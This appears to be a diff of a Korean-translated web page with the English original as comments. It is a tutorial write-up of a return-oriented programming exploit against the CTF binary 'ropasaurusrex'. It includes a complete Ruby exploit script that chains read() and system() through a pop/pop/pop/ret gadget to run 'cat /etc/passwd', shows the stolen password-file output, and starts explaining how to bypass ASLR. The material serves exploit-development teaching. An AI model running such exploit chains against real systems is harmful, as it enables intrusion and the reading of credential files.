+&lt;!-- ``` sh
+listening on [any] 4444 ...
+connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456
+Segmentation fault (core dumped)
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;4444&lt;/span&gt; ...
 connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; from debian-x86.skullseclabs.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 53456
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Then verify that it crashed at the return address of `read()` (`0x43434343`) and wrote the command to the memory at `0x08049530`: --&gt;
+
 &lt;p&gt;그게 &lt;code&gt;read()&lt;/code&gt;의 반환 주소(&lt;code&gt;0x43434343&lt;/code&gt;)에서 크래시를 일으켰고 명령어를 메모리 &lt;code&gt;0x08049530&lt;/code&gt;에 썼다는 걸 확인해라:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ gdb --quiet ./ropasaurusrex core
+[...]
+Program terminated with signal 11, Segmentation fault.
+#0  0x43434343 in ?? ()
+(gdb) x/s 0x08049530
+0x8049530:       &quot;cat /etc/passwd&quot;
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb --quiet ./ropasaurusrex core
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 Program terminated with signal 11, Segmentation fault.
@@ -2063,23 +2474,56 @@ Program terminated with signal 11, Segmentation fault.
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s 0x08049530
 0x8049530:       &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Perfect! --&gt;
+
 &lt;p&gt;완벽하다!&lt;/p&gt;
+
+&lt;!-- ### Running it --&gt;
 
 &lt;h3&gt;&lt;a id=&quot;running-it&quot;&gt;&lt;/a&gt;실행하기&lt;/h3&gt;
 
+&lt;!-- Now that we&#39;ve written `cat /etc/passwd` into memory, we need to call `system()` and point it at that address. It turns out, if we assume ASLR is off, this is easy. We know that the executable is linked with libc: --&gt;
+
 &lt;p&gt;이제 우린 &lt;code&gt;cat /etc/passwd&lt;/code&gt;를 메모리에 썼고, &lt;code&gt;system()&lt;/code&gt;을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ ldd ./ropasaurusrex
+        linux-gate.so.1 =&gt;  (0xb7703000)
+        libc.so.6 =&gt; /lib/i686/cmov/libc.so.6 (0xb75aa000)
+        /lib/ld-linux.so.2 (0xb7704000)
+&amp;ldquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd ./ropasaurusrex
         linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7703000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
         libc.so.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; /lib/i686/cmov/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75aa000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
         /lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7704000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And `libc.so.6` contains the `system()` function: --&gt;
+
 &lt;p&gt;그리고 &lt;code&gt;libc.so.6&lt;/code&gt;엔 &lt;code&gt;system()&lt;/code&gt; 함수가 포함되어 있다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ objdump -T /lib/i686/cmov/libc.so.6 | grep system
+000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
+00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
+00039450  w   DF .text  0000007d  GLIBC_2.0   system
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -T /lib/i686/cmov/libc.so.6 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep system
 000f5470 g    DF .text  &lt;span class=&quot;m&quot;&gt;00000042&lt;/span&gt;  GLIBC_2.0   svcerr_systemerr
 &lt;span class=&quot;m&quot;&gt;00039450&lt;/span&gt; g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
 &lt;span class=&quot;m&quot;&gt;00039450&lt;/span&gt;  w   DF .text  0000007d  GLIBC_2.0   system
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- We can figure out the address where `system()` ends up loaded in ropasaurusrex in our debugger: --&gt;
+
 &lt;p&gt;디버거를 통해 ropasaurusrex에서 로드된 &lt;code&gt;system()&lt;/code&gt; 주소를 알아낼 수 있다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ gdb --quiet ./ropasaurusrex core
+[...]
+Program terminated with signal 11, Segmentation fault.
+#0  0x43434343 in ?? ()
+(gdb) x/x system
+0xb7ec2450 &lt;system&gt;:    0x890cec83
+&amp;rdquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb --quiet ./ropasaurusrex core
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 Program terminated with signal 11, Segmentation fault.
@@ -2087,7 +2531,23 @@ Program terminated with signal 11, Segmentation fault.
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/x system
 0xb7ec2450 &amp;lt;system&amp;gt;:    0x890cec83
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Because `system()` only takes one argument, building the stackframe is pretty easy: --&gt;
+
 &lt;p&gt;&lt;code&gt;system()&lt;/code&gt;은 인자를 하나만 받으므로, 스택 프레임을 만드는 건 쉬운 편이다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          | - doesn&#39;t matter, other funcs will go here
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s stack frame
+|      void *arg       | - our buffer, 0x08049530
++----------------------+
+|   [return address]   | - where &#39;system&#39; will return
++----------------------+
+|         ...          | - doesn&#39;t matter, system() will use for locals
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
 +----------------------+
@@ -2100,7 +2560,35 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          | - 상관 없다, system() 지역 변수를 위해 사용할 것이다.
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Now if we stack this on top of our `read()` frame, things are looking pretty good: --&gt;
+
 &lt;p&gt;이제 이걸 &lt;code&gt;read()&lt;/code&gt; 프레임 위에 쌓으면 제법 괜찮아 보인다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s stack frame
+|      void *arg       |
++----------------------+
+|   [return address]   |
++----------------------+
+
++----------------------+ &lt;-- Start of read()&#39;s frame
+|     size_t count     |
++----------------------+
+|      void *buf       |
++----------------------+
+|        int fd        |
++----------------------+
+| [address of system]  | &lt;-- Stack pointer
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2125,7 +2613,35 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- At the moment that `read()` returns, the stack pointer is in the location shown above. When it returns, it pops `read()`&#39;s return address off the stack and jumps to it. When it does, this is what the stack looks like when `read()` returns: --&gt;
+
 &lt;p&gt;&lt;code&gt;read()&lt;/code&gt;가 반환하는 순간, 스택 포인터의 위치는 위에 나타낸 대로다. &lt;code&gt;read()&lt;/code&gt;가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 반환하면 스택은 이렇게 보일 것이다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s frame
+|      void *arg       |
++----------------------+
+|   [return address]   |
++----------------------+
+
++----------------------+ &lt;-- Start of read()&#39;s frame
+|     size_t count     |
++----------------------+
+|      void *buf       |
++----------------------+
+|        int fd        | &lt;-- Stack pointer
++----------------------+
+| [address of system]  |
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2150,11 +2666,47 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Uh oh, that&#39;s no good! The stack pointer is pointing to the middle of `read()`&#39;s frame when we enter `system()`, not to the bottom of `system()`&#39;s frame like we want it to! What do we do? --&gt;
+
 &lt;p&gt;어라, 이건 좋지 않다! &lt;code&gt;system()&lt;/code&gt;에 진입할 때, 스택 포인터는 우리가 원하는 &lt;code&gt;system()&lt;/code&gt; 프레임 바닥이 아닌 &lt;code&gt;read()&lt;/code&gt; 프레임의 안쪽을 가리키고 있다. 어떻게 해야 할까?&lt;/p&gt;
+
+&lt;!-- Well, when perform a ROP exploit, there&#39;s a very important construct we need called `pop/pop/ret`. In this case, it&#39;s actually `pop/pop/pop/ret`, which we&#39;ll call &quot;pppr&quot; for short. Just remember, it&#39;s enough &quot;pops&quot; to clear the stack, followed by a return. --&gt;
 
 &lt;p&gt;사실, ROP 익스플로잇을 수행할 때, &lt;code&gt;pop/pop/ret&lt;/code&gt;이라는 굉장히 중요한 구조가 있다. 이 경우엔 &lt;code&gt;pop/pop/pop/ret&lt;/code&gt;이며 이걸 줄여 &amp;ldquo;pppr&amp;quot;이라고 하자. 스택을 비우기에 충분한 &amp;quot;pop&amp;quot;들 뒤에 return이라는 것만 기억해라.&lt;/p&gt;
 
+&lt;!-- `pop/pop/pop/ret` is a construct that we use to remove the stuff we don&#39;t want off the stack. Since `read()` has three arguments, we need to pop all three of them off the stack, then return. To demonstrate, here&#39;s what the stack looks like immediately after `read()` returns to a `pop/pop/pop/ret`: --&gt;
+
 &lt;p&gt;스택에서 원하지 않는 것들을 지우기 위해 &lt;code&gt;pop/pop/pop/ret&lt;/code&gt;을 사용한다. &lt;code&gt;read()&lt;/code&gt;는 인자를 3개 받으므로, 우린 스택에서 그 셋을 모두 뽑은 다음 반환해야 한다. 설명을 위해 &lt;code&gt;read()&lt;/code&gt;가 &lt;code&gt;pop/pop/pop/ret&lt;/code&gt;으로 반환한 직후의 스택을 그려보자면 이렇다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s frame
+|      void *arg       |
++----------------------+
+|   [return address]   |
++----------------------+
+
++----------------------+ &lt;-- Special frame for pop/pop/pop/ret
+| [address of system]  |
++----------------------+
+
++----------------------+ &lt;-- Start of read()&#39;s frame
+|     size_t count     |
++----------------------+
+|      void *buf       |
++----------------------+
+|        int fd        | &lt;-- Stack pointer
++----------------------+
+| [address of &quot;pppr&quot;]  |
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2183,7 +2735,39 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- After &quot;pop/pop/pop/ret&quot; runs, but before it returns, we get this: --&gt;
+
 &lt;p&gt;&amp;quot;pop/pop/pop/ret&amp;quot;이 실행되고, 반환하기 직전엔 다음과 같다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s frame
+|      void *arg       |
++----------------------+
+|   [return address]   |
++----------------------+
+
++----------------------+ &lt;-- pop/pop/pop/ret&#39;s frame
+| [address of system]  | &lt;-- stack pointer
++----------------------+
+
++----------------------+
+|     size_t count     | &lt;-- read()&#39;s frame
++----------------------+
+|      void *buf       |
++----------------------+
+|        int fd        |
++----------------------+
+| [address of &quot;pppr&quot;]  |
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2212,7 +2796,39 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Then when it returns, we&#39;re exactly where we want to be: --&gt;
+
 &lt;p&gt;반환하고 나면, 정확히 우리가 원하는 것을 얻을 수 있다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s frame
+|      void *arg       |
++----------------------+
+|   [return address]   | &lt;-- stack pointer
++----------------------+
+
++----------------------+ &lt;-- pop/pop/pop/ret&#39;s frame
+| [address of system]  |
++----------------------+
+
++----------------------+ &lt;-- Start of read()&#39;s frame
+|     size_t count     |
++----------------------+
+|      void *buf       |
++----------------------+
+|        int fd        |
++----------------------+
+| [address of &quot;pppr&quot;]  |
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2241,7 +2857,19 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Finding a `pop/pop/pop/ret` is pretty easy using `objdump`: --&gt;
+
 &lt;p&gt;&lt;code&gt;pop/pop/pop/ret&lt;/code&gt;은 &lt;code&gt;objdump&lt;/code&gt;를 이용하면 어렵지 않게 찾을 수 있다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ objdump -d ./ropasaurusrex | egrep &#39;pop|ret&#39;
+[...]
+ 80484b5:       5b                      pop    ebx
+ 80484b6:       5e                      pop    esi
+ 80484b7:       5f                      pop    edi
+ 80484b8:       5d                      pop    ebp
+ 80484b9:       c3                      ret
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -d ./ropasaurusrex &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; egrep &lt;span class=&quot;s1&quot;&gt;&amp;#39;pop|ret&amp;#39;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  80484b5:       5b                      pop    ebx
@@ -2250,11 +2878,47 @@ Program terminated with signal 11, Segmentation fault.
  80484b8:       5d                      pop    ebp
  80484b9:       c3                      ret
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- This lets us remove between 1 and 4 arguments off the stack before executing the next function. Perfect! --&gt;
+
 &lt;p&gt;이건 다음 함수를 실행할 때 1~4개의 인자를 스택에서 지울 수 있게 해준다. 완벽하다!&lt;/p&gt;
+
+&lt;!-- And remember, if you&#39;re doing this yourself, ensure that the pops are at consecutive addresses. Using `egrep` to find them can be a little dangerous like that. --&gt;
 
 &lt;p&gt;그리고 이걸 직접 따라해 보고 있다면, pop들이 연속한 주소에 있어야 한다는 걸 기억해라. 그래서 &lt;code&gt;egrep&lt;/code&gt;으로 찾는 것은 약간 위험하다.&lt;/p&gt;
 
+&lt;!-- So now, if we want a triple `pop` and a `ret` (to remove the three arguments that `read()` used), we want the address `0x80484b6`, so we set up our stack like this: --&gt;
+
 &lt;p&gt;이제 우리는 세 개의 &lt;code&gt;pop&lt;/code&gt;과 &lt;code&gt;ret&lt;/code&gt;이 필요하면 (&lt;code&gt;read()&lt;/code&gt;가 사용한 세 개의 인자를 지우기 위해) 주소 &lt;code&gt;0x80484b6&lt;/code&gt;을 사용하면 될 것이다. 그러면 스택은 이렇게 될 것이다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- Start of system()&#39;s frame
+|      void *arg       | - 0x08049530 (buf)
++----------------------+
+|   [return address]   | - 0x44444444
++----------------------+
+
++----------------------+
+| [address of system]  | - 0xb7ec2450
++----------------------+
+
++----------------------+ &lt;-- Start of read()&#39;s frame
+|     size_t count     | - strlen(cmd)
++----------------------+
+|      void *buf       | - 0x08049530 (buf)
++----------------------+
+|        int fd        | - 0 (stdin)
++----------------------+
+| [address of &quot;pppr&quot;]  | - 0x080484b6
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2283,7 +2947,61 @@ Program terminated with signal 11, Segmentation fault.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- We also update our exploit with a `s.read()` at the end, to read whatever data the remote server sends us. The current exploit now looks like: --&gt;
+
 &lt;p&gt;원격 서버에서 보내는 걸 받기 위해 &lt;code&gt;s.read()&lt;/code&gt;를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:&lt;/p&gt;
+
+&lt;!-- ``` ruby
+require &#39;socket&#39;
+
+s = TCPSocket.new(&quot;localhost&quot;, 4444)
+
+# The command we&#39;ll run
+cmd = ARGV[0] + &quot;\0&quot;
+
+# From objdump -x
+buf = 0x08049530
+
+# From objdump -D ./ropasaurusrex | grep read
+read_addr = 0x0804832C
+# From objdump -D ./ropasaurusrex | grep write
+write_addr = 0x0804830C
+# From gdb, &quot;x/x system&quot;
+system_addr = 0xb7ec2450
+# From objdump, &quot;pop/pop/pop/ret&quot;
+pppr_addr = 0x080484b6
+
+# Generate the payload
+payload = &quot;A&quot;*140 +
+  [
+    # system()&#39;s stack frame
+    buf,         # writable memory (cmd buf)
+    0x44444444,  # system()&#39;s return address
+
+    # pop/pop/pop/ret&#39;s stack frame
+    system_addr, # pop/pop/pop/ret&#39;s return address
+
+    # read()&#39;s stack frame
+    cmd.length,  # number of bytes
+    buf,         # writable memory (cmd buf)
+    0,           # stdin
+    pppr_addr,   # read()&#39;s return address
+
+    read_addr # Overwrite the original return
+  ].reverse.pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
+
+# Write the &#39;exploit&#39; payload
+s.write(payload)
+
+# When our payload calls read() the first time, this is read
+s.write(cmd)
+
+# Read the response from the command and print it to the screen
+puts(s.read)
+
+# Clean up
+s.close()
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;TCPSocket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -2334,29 +3052,77 @@ Program terminated with signal 11, Segmentation fault.
 &lt;span class=&quot;c1&quot;&gt;# Clean up&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And when we run it, we get the expected result: --&gt;
+
 &lt;p&gt;그리고 실행하게 되면, 예상대로 나온다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ ruby sploit.rb &quot;cat /etc/passwd&quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+...
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 ...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And if you look at the [core dump][], you&#39;ll see it&#39;s crashing at `0x44444444` as expected. --&gt;
+
 &lt;p&gt;그리고 &lt;a href=&quot;https://en.wikipedia.org/wiki/Core_dump&quot;&gt;코어 덤프&lt;/a&gt;를 보면, 예상한 대로 &lt;code&gt;0x44444444&lt;/code&gt;에서 크래시를 일으킨다.&lt;/p&gt;
+
+&lt;!-- Done, right? --&gt;
 
 &lt;p&gt;끝났다, 그렇지?&lt;/p&gt;
 
+&lt;!-- WRONG! --&gt;
+
 &lt;p&gt;실은 틀렸다!&lt;/p&gt;
 
+&lt;!-- This exploit worked perfectly against my test machine, but when ASLR is enabled, it failed: --&gt;
+
 &lt;p&gt;이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ sudo sysctl -w kernel.randomize_va_space=1
+kernel.randomize_va_space = 1
+ron@debian-x86 ~ $ ruby sploit.rb &quot;cat /etc/passwd&quot;
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo sysctl -w kernel.randomize_va_space&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
 kernel.randomize_va_space &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- This is where it starts to get a little more complicated. Let&#39;s go! --&gt;
+
 &lt;p&gt;여기서부터 조금 더 복잡해진다. 가보자!&lt;/p&gt;
+
+&lt;!-- ## What is ASLR? --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;what-is-aslr&quot;&gt;&lt;/a&gt;ASLR이 뭐야?&lt;/h2&gt;
 
+&lt;!-- ASLR---or address space layout randomization---is a defense implemented on all modern systems (except for FreeBSD) that randomizes the address that libraries are loaded at. As an example, let&#39;s run ropasaurusrex twice and get the address of `system()`: --&gt;
+
 &lt;p&gt;ASLR&amp;mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&amp;mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 &lt;code&gt;system()&lt;/code&gt;의 주소를 알아내 보자:&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ perl -e &#39;printf &quot;A&quot;x1000&#39; | ./ropasaurusrex
+Segmentation fault (core dumped)
+ron@debian-x86 ~ $ gdb ./ropasaurusrex core
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? ()
+(gdb) x/x system
+0xb766e450 &lt;system&gt;:    0x890cec83
+
+ron@debian-x86 ~ $ perl -e &#39;printf &amp;quot;A&amp;quot;x1000&amp;rsquo; | ./ropasaurusrex
+Segmentation fault (core dumped)
+ron@debian-x86 ~ $ gdb ./ropasaurusrex core
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? ()
+(gdb) x/x system
+0xb76a7450 &lt;system&gt;:    0x890cec83
+&amp;rdquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;printf &amp;quot;A&amp;quot;x1000&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; ./ropasaurusrex
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasaurusrex core
@@ -2373,11 +3139,31 @@ Program terminated with signal 11, Segmentation fault.
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/x system
 0xb76a7450 &amp;lt;system&amp;gt;:    0x890cec83
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Notice that the address of `system()` changes from `0xb766e450` to `0xb76a7450`. That&#39;s a problem! --&gt;
+
 &lt;p&gt;&lt;code&gt;system()&lt;/code&gt;의 주소가 &lt;code&gt;0xb766e450&lt;/code&gt;에서 &lt;code&gt;0xb76a7450&lt;/code&gt;으로 바뀐 것을 보라. 이게 문제다!&lt;/p&gt;
+
+&lt;!-- ## Defeating ASLR --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;defeating-aslr&quot;&gt;&lt;/a&gt;ASLR 정복&lt;/h2&gt;
 
+&lt;!-- So, what do we know? Well, the binary itself isn&#39;t ASLRed, which means that we can rely on every address in it to stay put, which is useful. Most importantly, the relocation table will remain at the same address: --&gt;
+
 &lt;p&gt;그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ objdump -R ./ropasaurusrex
+
+./ropasaurusrex:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049600 R_386_GLOB_DAT    __gmon_start__
+08049610 R_386_JUMP_SLOT   __gmon_start__
+08049614 R_386_JUMP_SLOT   write
+08049618 R_386_JUMP_SLOT   __libc_start_main
+0804961c R_386_JUMP_SLOT   read
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -R ./ropasaurusrex
 
 ./ropasaurusrex:     file format elf32-i386
